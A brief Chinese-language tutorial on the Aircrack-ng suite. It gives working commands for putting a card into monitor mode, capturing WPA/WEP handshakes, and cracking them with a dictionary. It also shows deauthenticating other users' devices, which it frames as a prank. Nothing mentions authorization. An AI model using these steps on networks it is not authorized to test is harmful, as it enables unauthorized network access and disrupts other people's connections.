# Aircrack-ng套件简单使用

```
官网：http://www.aircrack-ng.org
简要介绍
Aircrack-ng：无线密码破解
Aireplay：生成网络数据，去客户端验证
Airodump-ng：数据包捕捉
Airbase-ng：配置伪造的接入点
Airmon-ng - 启用和禁用无线接口上的监控模式



ifconfig				#网络接口查看
ifconfig  eth0  up		#启动eth0网卡
ifconfig  eth0 down		#关闭eth0网卡

iwconfig				#查看无线网卡



杀掉可能产生影响的进程
airmon-ng  check  kill

将网卡切换至监听模式
airmon-ng  start  wlan0   # 停止可用 airmon-ng  stop  wlan0mon

获取附近无线网络列表（wlan0mon 这个是在将网卡切换至监听模式时得到的，可能是别的名字）
airodump-ng  wlan0mon

根据获取列表添加选项，最终得到握手包
airodump-ng  --ivs  -w  hello  -c  6  --bssid  23:45:67:89:AB:CD  wlan0mon
解释一下  
--ivs这个是保存成ivs格式的，体积比较小，如果只破解是够用了，没有这个选项的话，默认保存为cap格式
-w   保存文件名，工具会自动加编号
-c  指定频道，根据无线网络列表改值
--bssid   指定bssid，只捕获指定bssid的，别的丢弃


搞点恶作剧
如果捕获包的速度太慢，让连接网络的设备断掉重连
aireplay-ng  --deauth  10  -a  23:45:67:89:AB:CD  wlan0mon
--deauth  让别的客户端断开连接，后面的数字是发送几次，一般四五次应该够了
-a   无线网的bssid


破解
aircrack-ng  hello-01.ivs   # wep的可以这样破解，不用加字典
aircrack-ng  -w ./dic.txt  hello-01.ivs  # wpa之类的需要加字典



解决airmon-ng check kill  杀死的wpa_supplicant办法：
service network-manager restart

```


2017/9/2  
